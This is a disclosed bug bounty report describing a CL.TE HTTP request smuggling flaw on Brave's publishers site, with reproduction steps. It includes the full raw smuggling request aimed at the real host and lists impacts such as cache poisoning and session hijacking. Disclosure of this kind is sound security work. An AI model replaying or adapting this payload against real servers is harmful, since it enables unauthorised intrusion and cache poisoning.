# HTTP Request Smuggling

## Report Details
- **Report ID**: 866382
- **URL**: https://hackerone.com/reports/866382
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-05-05T11:39:58.197Z
- **Disclosed**: 2020-06-04T00:52:31.476Z

## Reporter
- **Username**: dracomalfoy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to "smuggle" a request to one device without the other device being aware of it. 

 publishers.basicattentiontoken.org is vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.

## Products affected: 

Brave Website. : publishers.basicattentiontoken.org

## Steps To Reproduce:
1.  Run the burp suite turbo intruder on the following request

```
POST /publishers/registrations.json HTTP/1.1
Host: publishers.basicattentiontoken.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://publishers.basicattentiontoken.org/sign-up
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Origin: https://publishers.basicattentiontoken.org
Content-Length: 136
DNT: 1
Connection: close
Transfer-encoding: chunked

35
{"terms_of_service":true,"email":"dhfs@kdjfksd.dfks"}
00

GET /assets/muli/Muli-Bold-ecdc1a24a0a56f42da0ee128d4c2e35235ef86acfbf98aab933aeb9cc5813bed.woff2 HTTP/1.1
Host: publishers.basicattentiontoken.org
foo: x


```

2. Script for tubro Intruder is attached. Word list can be any list containing any characters.
3. Observe 200 OK response for the /publishers/registrations.json post request which is supposed to give {"message":"Unverified request"}. Please refer the attached screenshot ( Smuggle Request1.png ) whih contain the expected response. 
4. This successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). A seprate report is attached as well.


Any suggestions or improvement in reports are welcome as this is my first report.

## Impact

It is possible to smuggle the request and disrupt the user experience. Session Hijacking, Privilege Escalation  and cache poisoning can be the impact of this vulnerability as well.
As unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.

For more information about the vulnerability please refer :
 https://cwe.mitre.org/data/definitions/444.html ;
  https://capec.mitre.org/data/definitions/33.html

## Attachments
- Scripts.txt
- SmuggleRequest1..PNG
- FinalResponse..PNG
